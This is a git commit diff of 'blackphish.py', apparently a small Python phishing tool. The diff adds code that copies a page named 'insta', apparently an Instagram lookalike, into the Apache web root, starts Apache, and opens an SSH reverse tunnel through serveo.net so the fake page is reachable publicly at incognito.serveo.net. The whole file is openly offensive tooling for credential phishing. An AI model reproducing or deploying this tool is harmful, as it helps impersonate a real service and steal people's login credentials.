daaeb11894ae9732eb9ee009e7c6145217200368
retro0001 <57078047+retro0001@users.noreply.github.com>
2019-10-29 02:13:17 +0530

    Add files via upload

--- blackphish.py
+++ blackphish.py
@@ -1,28 +1,47 @@
 try:
-	import os
-
+        import os
+        
 except ImportError():
-	print("Error importing")
-	exit(1)
+        print("Error importing")
+        exit(1)
 
 
 def install(): # Host webpage #
-	os.system('cp /usr/share/Blackphish/insta /var/www/html/')
-
-
+        os.system('cp /usr/share/Blackphish/insta /var/www/html/')
+def servo_forward(): #Forwardinf to servo#
+                os.system('nohup ssh -R incognito:80:localhost:80 serveo.net &')
+                #subprocess.Popen(["rm","-r","some.file"])
 
 def main():  # Main script #
-    choice = input("[BlackPhish] -> ") # Get user input #
-    if choice in "1":
-    	install()
-		os.system('clear')
-
-
+        choice = input("[BlackPhish] -> ") # Get user input #
+        if choice == "1":
+                print('[*] Copying Files')
+                install()
+                print('[*] Startig Apache2 Service')
+                os.system('service apache2 start')
+                servo_forward()
+                print('[*] Forwarding Traffic to "https://incognito.serveo.net/"')
+                print('[*] Done')
+                #os.system('clear')
+                main()
+        #elif choice == "clean":
+            #os.system('service apache2 stop')
+            
+        elif choice == "":
+                main()
+        elif choice == "clear":
+            os.system('clear')
+            main()
+        #elif choice == "ls":
+            #os.system('ls')
+            #main()
+        #elif choice == "help"
+            #print('')
+        
 
 try: # This will start the script
-	if __name__ = '__main__':
-		main()
-
+        if __name__ == '__main__':
+                main()
 except KeyboardInterrupt(): # Will detect if they exit #
-	print("Exiting")
-	exit(0)
+        print("Exiting")
+        exit(0)
